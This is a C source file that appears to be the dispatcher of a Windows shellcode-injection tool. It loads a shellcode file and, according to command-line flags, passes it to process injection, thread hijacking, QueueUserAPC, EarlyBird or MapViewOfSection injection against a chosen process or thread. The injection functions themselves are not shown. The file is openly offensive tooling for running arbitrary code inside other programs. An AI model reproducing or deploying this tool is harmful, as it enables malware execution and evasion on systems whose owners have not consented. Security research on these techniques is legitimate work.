#include "techniques.h"
#include "macros.h"
#include "structs.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>



shellcodeinfos openshellcode(char* path)
{

	shellcodeinfos infos;
	FILE *fp = fopen(path, "rb");
	if (fp == NULL)
	{
		error("Failed To Open File");
	}
	fseek(fp, 0, SEEK_END);
	size_t size = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	BYTE* shellcode = (BYTE*)malloc(size);

	if (!fread(shellcode, 1, size, fp))
	{
		error("Failed To Read Shellcode Into Memory");
	}

	infos.shellcode = shellcode;
	infos.size = size;
	fclose(fp);

	return infos;


}
shellcodeinfos infos;
int shellcodeinjection_main(int argc, char* argv[])
{

	DWORD PID = -1;
	DWORD TID = -1;
	char* path = NULL;
	int technique = -1;
	int count = 0;


	for (int i = 0; i < argc; i++)
	{
		if (strcmp(argv[i],"-pid") == 0 && i + 1 < argc)
		{
			PID = atoi(argv[++i]);
			
			
		}
		if (strcmp(argv[i], "-tid") == 0 && i + 1 < argc)
		{
			TID = atoi(argv[++i]);
		}
		if (strcmp(argv[i],"-sc") == 0 && i + 1 < argc)
		{
			path = argv[++i];
			
			
		}
		if (strcmp(argv[i],"-t") == 0 && i + 1 < argc)
		{
			technique = atoi(argv[++i]);
		}
	}
	if (PID == 0)
	{
		PID = GetCurrentProcessId();
	}
	infos = openshellcode(path);

	switch (technique)
	{

	case 0:
		if (PID == -1 || path == NULL)
		{
			error("Invalid Syntax | Run With --help for help menu");
			return -1;
		}
		ProcessInjection(PID, infos.shellcode,infos.size);
		break;

	case 1:
		if (PID == -1 || path == NULL || TID == -1)
		{
			error("Invalid Syntax | Run With --help for help menu");
			return -1;
		}
		ThreadHijacking(PID, TID, infos.shellcode, infos.size);
		break;
	case 2:
		if (PID == -1 || path == NULL || TID == -1)
		{
			error("Invalid Syntax | Run With --help for help menu");
			return -1;
		}
		QueueUserAPCInjection(PID, TID, infos.shellcode, infos.size);
		break;
	case 3:
		if (path == NULL)
		{
			error("Invalid Syntax | Run With --help for help menu");
			return -1;
		}
		EarlyBird(infos.shellcode, infos.size);
		break;
	case 4:
		if (PID == -1 || path == NULL)
		{
			error("Invalid Syntax | Run With --help for help menu");
			return -1;
		}
		MapViewOfSectionInjection(PID, infos.shellcode, infos.size);
		break;
		
	default:
		error("Invalid Technique id refer to the help menu for available techniques");
		break;
	}


}

